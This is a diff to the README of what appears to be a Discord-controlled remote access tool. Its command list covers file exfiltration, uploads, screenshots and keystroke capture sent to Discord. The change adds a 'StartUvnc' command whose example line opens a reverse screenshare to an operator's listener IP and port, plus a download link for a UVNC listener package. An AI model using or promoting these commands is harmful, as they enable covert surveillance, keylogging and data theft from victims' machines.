@@ -64,6 +64,7 @@ Every 10 seconds it will check for a new message in chat and interpret it as a c
 - **Exfiltrate**: Send various files. (see ExtraInfo)
 - **Upload**: Upload a file from connected machine. (see ExtraInfo)
 - **Download**: Download a file to the current directory on the client. (attach a file with the command)
+- **StartUvnc**: Start UVNC client (screenshare) `StartUvnc -ip 192.168.1.1 -port 8080` and on your host / listener use `./vncviewer.exe -listen 8080`
 - **Screenshot**: Sends a screenshot of the desktop and send to Discord
 - **Keycapture**: Capture Keystrokes and send to Discord
 
@@ -105,5 +106,10 @@ Control all waiting sessions simultaneously with 'controll-all' to mass authenti
 **Killswitch**
 
 Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
+
+**UVNC Listener / Server**
+Zip File - https://github.com/beigeworm/assets/raw/main/uvnc-server.zip
+
+
 
 # If you like my work please leave a star. ⭐
